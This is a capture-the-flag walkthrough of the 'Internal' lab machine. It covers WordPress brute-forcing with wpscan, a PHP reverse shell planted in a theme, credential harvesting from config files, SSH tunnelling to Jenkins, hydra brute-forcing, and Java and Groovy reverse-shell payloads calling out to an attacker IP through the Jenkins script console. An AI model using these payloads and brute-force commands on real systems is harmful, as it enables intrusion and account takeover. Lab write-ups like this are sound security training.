<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>internal</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>internal</h1><br/><p><strong>Internal</strong></p><p></p><p>We do nmap scan to find only 2 ports open 22 and 80</p><p>Running standard SSH and Webserver.</p><p></p><p>We add the IP to hosts file as internal.htm</p><p></p><p>10.10.41.53     internal.thm</p><p></p><p></p><p>Next we enumerate hidden directories using gobuster.</p><p></p><p><img src="images/13-1.png" alt="images/13-1.png" /></p><p></p><p>We see one post from admin in the <strong>/blog</strong> page. (Confirming a user named admin)</p><p>We confirm it uses wordpress from <strong>wappalyzer</strong> app of firefox and also view source.</p><p>The Blog directory has a login page of wp-admin.</p><p></p><p>However, we do not have any credentials yet.</p><p>From here there are 2 options:</p><p></p><p>1. Use wp-scan tool and finally bruteforce with it [Selected]</p><p>OR</p><p>2. Directly bruteforce with hydra</p><p></p><p></p><p><strong><span style="text-decoration:underline;">Using wpscan:</span></strong></p><p></p><p><em><strong>wpscan --url http://internal.thm/blog</strong></em></p><p>This will do a initial scan to find any known vulnerabilities.</p><p></p><p><em><strong>wpscan --url http://internal.thm/blog -e u</strong></em></p><p>This will enumerate the users. We find an user named <strong>admin</strong>. As found earlier</p><p></p><p>Then we bruteforce using wpscan</p><p><em><strong>wpscan --url http://internal.thm/blog --usernames admin --passwords /usr/share/wordlists/rockyou.txt --max-threads 100</strong></em></p><p><em><strong></strong></em><strong>Note:</strong> We can use <em>-U or --usernames</em> and <em>-P or ---passwords</em></p><p></p><p>The process is very slow and time taking hence we increase thead count by <em>--max-threads 100</em></p><p><em></em></p><p></p><p>We crack the password:</p><p>Username	:	admin</p><p>Password		:	my2boys</p><p></p><p>We login to the wp-admin area. In the dashboard we see posts.</p><p>One Private Post revealed a credential: 	</p><p><em><strong>Don&#39;t forget to reset Will&#39;s credentials. william:arnold147</strong></em></p><p></p><p>We save it for later after checking the ssh login. <em>It is never used in this CTF</em></p><p></p><p></p><p>Next,</p><p>1. We focus on the apperance → edit theme </p><p>And select any php page.  Edit/remove its content and paste a php-reverse-shell code with proper IP and Port</p><p></p><p>2. Start netcat listener</p><p></p><p>3.</p><p><strong>Note:</strong> The most important aspect is finding this page to trigger the reverse shell.</p><p>Location is follows:</p><p></p><p><em><strong>http://internal.thm/wordpress/wp-content/themes/twentyseventeen/***.php</strong></em></p><p><strong>Note:</strong> whichever page we have edited, replace the *** with that page.</p><p></p><p>eg.</p><p><em><strong>http://internal.thm/wordpress/wp-content/themes/twentyseventeen/404.php</strong></em></p><p><em><strong></strong></em>if edited 404.php<em><strong></strong></em></p><p><em><strong>http://internal.thm/wordpress/wp-content/themes/twentyseventeen/archive.php</strong></em></p><p>If edited archive.php</p><p></p><p>Once we open the exploited pages, we will get a connection as www-root with no access to user or root flag.</p><p></p><p><strong>Upgrading to higher privilege user:</strong></p><p>From the initial access we can download and runs <strong>LinPEAS.sh</strong> for privilege escalation. We find we intresting files.</p><p>We also discover that root login is permitted in SSH provided we have the password.</p><p></p><p>1.</p><p>/etc/phpmyadmin/config-db.php</p><p></p><p>&lt;?php</p><p>##</p><p>## database access settings in php format</p><p>## automatically generated from /etc/dbconfig-common/phpmyadmin.conf</p><p>## by /usr/sbin/dbconfig-generate-include</p><p>##</p><p>## by default this file is managed via ucf, so you shouldn&#39;t have to</p><p>## worry about manual changes being silently discarded.  *however*,</p><p>## you&#39;ll probably also want to edit the configuration file mentioned</p><p>## above too.</p><p>##</p><p>$dbuser=&#39;phpmyadmin&#39;;</p><p>$dbpass=&#39;B2Ud4fEOZmVq&#39;;</p><p>$basepath=&#39;&#39;;</p><p>$dbname=&#39;phpmyadmin&#39;;</p><p>$dbserver=&#39;localhost&#39;;</p><p>$dbport=&#39;3306&#39;;</p><p>$dbtype=&#39;mysql&#39;;</p><p></p><p>The file has username and password for phpmyadmin.</p><p>We login through <em><strong>http://internal.thm/phpmyadmin</strong></em></p><p>We can see the phpmyadmin database, but didn&#39;t find anything useful.</p><p></p><p>2.</p><p>/etc/wordpress/config-localhost.php</p><p>&lt;?php</p><p>define(&#39;DB_NAME&#39;, &#39;wordpress&#39;);</p><p>define(&#39;DB_USER&#39;, &#39;wordpress&#39;);</p><p>define(&#39;DB_PASSWORD&#39;, &#39;wordpress123&#39;);</p><p>define(&#39;DB_HOST&#39;, &#39;localhost&#39;);</p><p>define(&#39;DB_COLLATE&#39;, &#39;utf8_general_ci&#39;);</p><p>define(&#39;WP_CONTENT_DIR&#39;, &#39;/var/www/html/wordpress/wp-content&#39;);</p><p>?&gt;</p><p></p><p>We can again login to <em><strong>http://internal.thm/phpmyadmin</strong></em> using the above credentials.</p><p>We can see the wordpress database, but didn&#39;t find anything useful.</p><p></p><p>3.</p><p>/opt/wp-save.txt</p><p>Bill,</p><p></p><p>Aubreanna needed these credentials for something later.  Let her know you have them and where they are.</p><p></p><p><em><strong>aubreanna:bubb13guM!@#123</strong></em></p><p></p><p></p><p>Finally, we find user crendentials in the text file.</p><p>Now we can SSH into the machine using the above.</p><p></p><p>Then we get the user flag in <strong>aunreanna</strong> home folder</p><p></p><p></p><p></p><p><strong>Root Privilege Escalation:</strong></p><p>There is one more intresting file in the home folder.</p><p></p><p><em><strong>cat jenkins.txt</strong></em></p><p>Internal Jenkins service is running on 172.17.0.2:8080</p><p></p><p>This tells us that a local jenkins server is running in a container.</p><p></p><p><em><strong>netstat -tan | grep 8080</strong></em></p><p>The above command checks the connections and confirms that 127.0.0.1:8080 is indeed accessible for localhost only.</p><p></p><p>The way around this is using SSH Tunneling.</p><p></p><p><em><strong>ssh -L 9999:172.17.0.2:8080 aubreanna@internal.thm</strong></em></p><p><em><strong>ssh -L 9999:127.0.0.1:8080 aubreanna@internal.thm</strong></em></p><p></p><p>we can use anyone of the them and once we login. Our target machine can access the Jenkins server page by</p><p><em><strong>http://localhost:9999</strong></em></p><p></p><p>We have a jenkins login page. However, any of the old passwords we found didn&#39;t work.</p><p>Then,</p><p>We tried test:test and admin:admin</p><p>It gave a clue, stating admin is indeed an user</p><p></p><p>Finally we will bruteforce this login page using hydra:</p><p></p><p>We capture a login post request using burpsuite to get the 2 components for hydra</p><p>we get the 3rd component from login error. </p><p></p><p>1. /j_acegi_security_check</p><p>2. j_username=admin&amp;j_password=bazinga&amp;from=%2F&amp;Submit=Sign+in</p><p>3. Invalid username or password</p><p></p><p></p><p>Then the following is our crafted hydra syntax:</p><p></p><p><em><strong>hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 9999 127.0.0.1 http-post-form &quot;/j_acegi_security_check:j_username=^USER^&amp;j_password=^PASS^&amp;from=%2F&amp;Submit=Sign+in:Invalid username or password&quot; -vv</strong></em></p><p></p><p>We get the credentials for Jenkins as:</p><p></p><p>User: admin</p><p>Pass: spongebob</p><p></p><p>Once inside jenkins dashboard, go to mange -→ script console</p><p></p><p>Here we can use either groovy code or java code for reverse shell and click on run once we are ready with a listner.</p><p></p><p><strong>JAVA:</strong> (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)</p><p><em><strong>r = Runtime.getRuntime()</strong></em></p><p><em><strong>p = r.exec([&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/10.11.72.31/6666;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done&quot;] as String[])</strong></em></p><p><em><strong>p.waitFor()</strong></em></p><p></p><p><strong>GROOVY:</strong> (https://cybexray.github.io/revshell/revshell.html)</p><p><em><strong>String host=&quot;10.11.72.31&quot;;int port=6666;String cmd=&quot;/bin/sh&quot;;Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()&gt;0)so.write(pi.read());while(pe.available()&gt;0)so.write(pe.read());while(si.available()&gt;0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();</strong></em></p><p></p><p>We will get a shell in our listner with the user <strong>jenkins</strong>.</p><p><strong>Note:</strong> We are now accessing the containerized environment.</p><p></p><p>We find an intresting text file inside /opt</p><p><em><strong>cat /opt/note.txt</strong></em></p><p></p><p>root:tr0ub13guM!@#123</p><p></p><p>This files contains the root password for the internal.thm machine.</p><p></p><p>We <strong>ssh</strong> as root using the credentials found here and retrieve the root flag.</p><p></p><p>Thanks!!</p></div>
</body>
</html>
